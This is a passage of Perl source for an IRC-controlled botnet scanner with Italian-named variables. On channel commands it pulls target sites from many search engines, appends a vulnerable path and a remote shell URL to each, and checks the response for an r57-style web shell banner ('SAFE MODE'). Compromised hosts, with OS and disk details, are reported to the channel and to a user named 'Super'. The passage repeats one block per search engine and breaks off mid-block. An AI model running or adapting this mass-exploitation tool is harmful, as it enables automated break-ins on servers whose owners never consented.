my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaDe");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaDe");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @searchlist=&altavistaus($chiave);
push ( my @tot, @searchlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13AltavistaUs7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9AltavistaUs Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13AltavistaUs Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaUs");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaUs");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltavistaUs");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @ask=&ask($chiave);
push ( my @tot, @ask );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Ask7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Ask Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Ask Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ask");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ask");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @ask2=&ask2($chiave);
push ( my @tot, @ask2 );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Ask27:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Ask2 Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Ask2 Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ask2");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ask2");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @cuil=&cuil($chiave);
push ( my @tot, @cuil );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Cuil7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Cuil Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Cuil Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Cuil");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Cuil");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @powlist=&powersearch($chiave);
push ( my @tot, @powlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13PowerSearch7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9PowerSearch Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13PowerSearch Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su PowerSearch");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su PowerSearch");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @allist=&alltheweb($chiave);
push ( my @tot, @allist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Alltheweb7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Alltheweb Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Alltheweb Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Alltheweb");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Alltheweb");
}}
}}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @highitlist=&highit($chiave);
push ( my @tot, @highitlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13HispeedIt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9HispeedIt Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13HispeedIt Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su HispeedIt");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su HispeedIt");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @highlist=&high($chiave);
push ( my @tot, @highlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Hispeed7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Hispeed Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Hispeed Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Hispeed");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Hispeed");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @work2list=&work2($chiave);
push ( my @tot, @work2list );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Work27:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Work2 Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Work2 Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Work2");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Work2");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @work3list=&work3($chiave);
push ( my @tot, @work3list );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Work37:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Work3 Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Work3 Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Work3");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Work3");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @szukaczlist=&szukacz($chiave);
push ( my @tot, @szukaczlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Szukacz7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Szukacz Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Szukacz Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Szukacz");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Szukacz");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @onetlist=&onet($chiave);
push ( my @tot, @onetlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Onet7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Onet Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Onet Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Onet");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Onet");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @sapolist=&sapo($chiave);
push ( my @tot, @sapolist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Sapo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Sapo Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Sapo Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Sapo");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Sapo");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @uollist=&uol($chiave);
push ( my @tot, @uollist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Uol7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Uol Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Uol Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Uol");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Uol");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @niglist=&nigma($chiave);
push(my @tot, @niglist);
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Nigma.ru7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Nigma.ru Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Nigma.ru Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Nigma.ru");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Nigma.ru");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @zizuplist=&zizup($chiave);
push(my @tot, @zizuplist);
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Zizup7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Zizup Testati ".$contatore." su ".$uni. " siti");
